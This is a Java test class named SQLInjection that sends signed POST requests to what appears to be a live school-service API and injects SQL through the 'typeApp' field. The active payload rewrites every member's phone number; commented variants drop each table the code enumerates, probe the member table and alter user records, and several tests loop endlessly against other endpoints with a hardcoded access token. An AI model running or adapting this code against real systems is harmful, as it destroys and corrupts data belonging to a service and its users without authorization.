package cn.emay;

import java.nio.charset.Charset;
import java.util.List;

import org.apache.http.client.methods.HttpUriRequest;
import org.apache.http.client.methods.RequestBuilder;
import org.apache.http.entity.StringEntity;
import org.junit.Test;
import org.nutz.dao.Sqls;
import org.nutz.dao.sql.Sql;
import org.nutz.ioc.Ioc;
import org.nutz.ioc.impl.NutIoc;
import org.nutz.ioc.loader.combo.ComboIocLoader;
import org.nutz.json.Json;

import cn.emay.common.client.LocalHttpClient;
import cn.emay.common.util.PostParamsModel;
import cn.emay.common.util.SignatureUtils;
import cn.emay.dao.BasicDao;
import cn.emay.dto.PgTables;
import cn.emay.response.ResponeResultModel;

public class SQLInjection {

	static String BASE_URI="http://y.ssjyw.cn/SchoolService";
//	static String BASE_URI="http://localhost:8080/SchoolService";
	
	static Ioc ioc=null;
	static BasicDao basicDao;
	static {
//		try {
//			ioc = new NutIoc(new ComboIocLoader("*org.nutz.ioc.loader.json.JsonLoader",
//					"/conf/datasource.js",
//					"*org.nutz.ioc.loader.annotation.AnnotationIocLoader",
//					"cn.emay"));
//			
//			basicDao=ioc.get(BasicDao.class, "basicDao");
//		} catch (ClassNotFoundException e) {
//			e.printStackTrace();
//		}
	}
	
	@Test
	public void getTables(){
		Sql sql= Sqls.create("select tablename from pg_tables where schemaname='public'");
		sql.setCallback(Sqls.callback.entities());
		sql.setEntity(basicDao.getDao().getEntity(PgTables.class));
		basicDao.getDao().execute(sql);
		List<PgTables>pgTablesList=sql.getList(PgTables.class);
		for(PgTables pg: pgTablesList){
			if(!"app_ad".equals(pg.getTablename()) && !"sys_picture".equals(pg.getTablename())){
				System.out.println(pg.getTablename());
				findAppAdList(pg.getTablename());
			}
			
		}
	}

	@Test
	public void deleteTable(){
		findAppAdList("sys_message");
	}
	
	/**
	 * 
	 * 
	 * sql注入
	 * app广告接口
	 */
	static public void findAppAdList(String tableName){
		String accessToken="zjlwm";
		PostParamsModel params=new PostParamsModel();
		params.setNonce((int)((Math.random()*9+1)*100000)+"");
//		params.setPostData("{adType:\"2\",typeApp:\"1\"}");
		//AppAdDao.findAppAdList("5", "1';BEGIN;drop table s_adviser_remarks;COMMIT;--");
		
		
		
//		params.setPostData("{adType:\"5\",typeApp:\"1';BEGIN;drop table "+tableName+";COMMIT;--\"}");

		//params.setPostData("{adType:\"5\",typeApp:\"1'  or 1=(select count(*) from s_member)--\"}");
		
		// 
		//params.setPostData("{adType:\"5\",typeApp:\"1'  or 1=(select count(*) from s_member)--\"}");
		
		
		/**
		 * 修改会员手机号码
		 */
		params.setPostData("{adType:\"5\",typeApp:\"1';BEGIN;update s_member m set mobilephone=(to_number(m.mobilephone,'99999999999')+to_number(substring(m.mobilephone,2,2),'99'));COMMIT;--\"}");
		
		
//		params.setPostData("{adType:\"5\",typeApp:\"1' ;SAVEPOINT my_savepoint; update sys_user set signature='' where  del_flag='0'; ROLLBACK TO my_savepoint; --\"}");
//		
		
		String signature=SignatureUtils.getSignature(accessToken, params.getPostData(), params.getNonce());
		params.setSignature(signature);
		
		
		String dd=Json.toJson(params);
		System.out.println("dd:"+dd);
		
		HttpUriRequest httpUriRequest = RequestBuilder.post()
				.setUri(BASE_URI+"/service/appAd/list")
				.setEntity(new StringEntity(Json.toJson(params),Charset.forName("UTF-8")))
				.build();
		ResponeResultModel result=LocalHttpClient.executeJsonResult(httpUriRequest, ResponeResultModel.class);
		System.out.println(Json.toJson(result));
		
	}
	
	@Test
	public void dd(){
		while(true){
			/**
			 * 参加活动查询
			 */
				String accessToken="zjlwm";
				PostParamsModel params=new PostParamsModel();
				params.setNonce((int)((Math.random()*9+1)*100000)+"");
				params.setPostData("{memberId:\"a7ee38d6352e42919d5e0b9e08ffc0d6\"}");
				String signature=SignatureUtils.getSignature(accessToken, params.getPostData(), params.getNonce());
				params.setSignature(signature);
				HttpUriRequest httpUriRequest = RequestBuilder.post()
						.setUri(BASE_URI+"/service/consultant/adviserActivityRecord/list")
						.setEntity(new StringEntity(Json.toJson(params),Charset.forName("UTF-8")))
						.build();
				ResponeResultModel result=LocalHttpClient.executeJsonResult(httpUriRequest, ResponeResultModel.class);
				System.out.println(Json.toJson(result));
			
		}
	}
	
	/**
	 * 参加活动类型列表
	 */
	@Test
	public void findAdviserActivity(){
		while(true){
			String accessToken="zjlwm";
			PostParamsModel params=new PostParamsModel();
			params.setNonce((int)((Math.random()*9+1)*100000)+"");
			params.setPostData("{}");
			String signature=SignatureUtils.getSignature(accessToken, params.getPostData(), params.getNonce());
			params.setSignature(signature);
			HttpUriRequest httpUriRequest = RequestBuilder.post()
					.setUri(BASE_URI+"/service/consultant/adviserActivity/list")
					.setEntity(new StringEntity(Json.toJson(params),Charset.forName("UTF-8")))
					.build();
			ResponeResultModel result=LocalHttpClient.executeJsonResult(httpUriRequest, ResponeResultModel.class);
			System.out.println(Json.toJson(result));
		}
		
	}
	
	
	@Test
	public  void ks(){
		while(true){
			String accessToken="zjlwm";
			String siteId="zjlwm";
			PostParamsModel params=new PostParamsModel();
			params.setNonce((int)((Math.random()*9+1)*100000)+"");
			params.setPostData("{}");
			params.setSiteId(siteId);
			String signature=SignatureUtils.getSignature(accessToken, params.getPostData(), params.getNonce());
			params.setSignature(signature);
			HttpUriRequest httpUriRequest = RequestBuilder.post()
					.setUri(BASE_URI+"/service/school/findGrade")
					.setEntity(new StringEntity(Json.toJson(params),Charset.forName("UTF-8")))
					.build();
			ResponeResultModel result=LocalHttpClient.executeJsonResult(httpUriRequest, ResponeResultModel.class);
			System.out.println(Json.toJson(result));
		}
	}
}
